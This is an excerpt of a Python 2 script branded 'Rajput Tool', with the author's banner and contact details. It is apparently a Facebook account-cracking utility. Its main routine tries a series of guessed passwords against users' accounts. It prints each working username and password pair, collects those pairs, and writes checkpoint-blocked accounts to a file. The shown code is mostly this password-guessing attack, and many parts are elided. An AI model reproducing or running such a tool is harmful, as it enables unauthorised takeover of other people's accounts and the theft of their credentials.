...
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
██████████████████████████
❥━Auther   : Rana Nadeem Rajput
❥━GitHub   : https://github.com/Rananadeem5214
❥━Whatsap  : 03082503426
❥━Facebook : Rana Nadeem Rajput
██████████████████████████
                                """
...
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[Rana] Loging In "+o),;sys.stdout.flush();time.sleep(1)
...
def token():
	...
	try:
		...
		zedd.write(toket)
		zedd.close()
		print '\033[0;92m√ Wellcome To Rajput Tool'
		menu()
	except KeyError:
...
def action():
	...
	if chb =="":
	    ...
	    psb("✓")
	    psb("✓")
	    psb("Congratulations Rajput Tool Has Been Updated Successfully")
	    time.sleep(2)
	    menu()
	elif chb =="7":
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				print "\x1b[1;92m[Rana.ok]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Rana.cp] " + user + " | " + pass1
					...
					q = json.load(data)
					if "access_token" in q:
						print "\x1b[1;92m[Rana.ok]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print "[Rana.cp] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							...
							q = json.load(data)
							if "access_token" in q:
								print "\x1b[1;92m[Rana.ok]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print "[Rana.cp] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									...
									q = json.load(data)
									if "access_token" in q:
										print "\x1b[1;92m[Rana.ok]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print "[Rana.cp] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											...
											q = json.load(data)
											if "access_token" in q:
												print "\x1b[1;92m[Rana.ok]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print "[Rana.cp] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													...
													q = json.load(data)
													if "access_token" in q:
														print "\x1b[1;92m[Rana.ok]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print "[Rana.cp] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															...
															q = json.load(data)
															if "access_token" in q:
																print "\x1b[1;92m[Rana.ok]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print "[Rana.cp] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
